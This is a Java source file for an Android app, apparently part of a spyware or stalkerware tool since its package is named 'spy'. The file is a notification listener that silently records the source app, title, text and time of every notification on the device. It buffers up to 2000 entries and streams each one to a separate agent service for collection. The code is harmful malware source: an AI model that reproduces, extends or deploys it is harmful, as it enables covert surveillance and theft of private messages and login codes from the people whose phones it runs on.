package ai.m4zk1play.spy;

import android.app.Notification;
import android.os.Bundle;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class NotifListener extends NotificationListenerService {

    private static final List<String> BUFFER = new ArrayList<>();
    private static NotifListener live;

    @Override public void onListenerConnected() { live = this; }
    @Override public void onListenerDisconnected() { if (live == this) live = null; }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            Bundle ex = sbn.getNotification().extras;
            String title = String.valueOf(ex.getCharSequence(Notification.EXTRA_TITLE));
            String text = String.valueOf(ex.getCharSequence(Notification.EXTRA_TEXT));
            JSONObject o = new JSONObject();
            o.put("pkg", sbn.getPackageName());
            o.put("title", title);
            o.put("text", text);
            o.put("ts", sbn.getPostTime());
            String line = o.toString();
            synchronized (BUFFER) {
                BUFFER.add(line);
                while (BUFFER.size() > 2000) BUFFER.remove(0);
            }
            if (AgentService.instance != null) AgentService.instance.emitStream("notif", line);
        } catch (Exception ignored) {
        }
    }

    public static List<String> drain() {
        synchronized (BUFFER) {
            List<String> copy = new ArrayList<>(BUFFER);
            BUFFER.clear();
            return copy;
        }
    }

    public static boolean alive() { return live != null; }
}
